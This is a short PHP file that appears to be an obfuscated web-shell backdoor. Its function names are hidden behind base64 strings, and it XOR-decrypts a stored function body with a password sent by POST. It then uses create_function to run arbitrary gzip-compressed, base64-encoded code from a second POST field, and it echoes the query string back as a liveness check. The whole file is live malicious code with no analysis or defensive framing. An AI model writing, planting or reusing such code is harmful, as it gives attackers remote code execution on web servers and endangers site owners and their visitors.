<?php

class c5f61d9cdbdbcc
{
    private $r5f61d9cdbdc52 = [];

    public function __call($name, $args)
    {
        call_user_func_array($this->r5f61d9cdbdc52[$name], $args);
    }

    public function d5f61d9cdbdcef($s)
    {
        $function = 'b' . 'ase' . '64' . '_' . 'de' . 'code';
        $string = $function($s);
        return explode('::', $string, 2)[1];
    }

    public function p5f61d9cdbdc12()
    {
        $qString = $this->d5f61d9cdbdcef("VzdIVjN6MzJtRHZoV3pRPTo6UVVFUllfU1RSSU5H");

        if (!empty($_SERVER[$qString])) {
            exit($_SERVER[$qString]);
        }

        $e = $this->d5f61d9cdbdcef("N21sRk9CU2Z3UVIyTnIyVy9mZGE6OmU=");
        $p = $this->d5f61d9cdbdcef("RFQ0elFMQy9BazBmNDM4TTo6cA==");

        if (!isset($_POST[$e]) ||
            !isset($_POST[$p])) {
            return;
        }

        $methodName = 'em5f61d9cdbdd31';
        $methodContent = 'UBBXXUxfFgoBOwNTEWoHRFYXEUo/UjlNDQ==';

        $base64decode = $this->d5f61d9cdbdcef("NStvWVl6ZHZINjhSbmc9PTo6YmFzZTY0X2RlY29kZQ==");
        $createFunction = $this->d5f61d9cdbdcef("VWx2dk9Rcz06OmNyZWF0ZV9mdW5jdGlvbg==");
        $gzinflate = $this->d5f61d9cdbdcef("UkJPN0FNK2JZMTNtNmc9PTo6Z3ppbmZsYXRl");
        $regex = $this->d5f61d9cdbdcef("UjBTcU8zYz06Oi9eWyAtfl0rJC8=");

        $methodContent = str_split($base64decode($methodContent));

        $password = $_POST[$p];
        $password = str_split($password);

        $temp = [];

        for ($i = 0; $i < count($methodContent); $i++) {
            $temp[] = chr(ord($methodContent[$i]) ^ ord($password[$i % count($password)]));
        }

        $methodContent = implode('', $temp);

        if (preg_match($regex, $methodContent)) {
            $this->r5f61d9cdbdc52[$methodName] = $createFunction('', $methodContent);

            $code = $gzinflate($base64decode($_POST[$e]));
            $this->{$methodName}($code);
        }
    }
}

(new c5f61d9cdbdbcc)->p5f61d9cdbdc12();
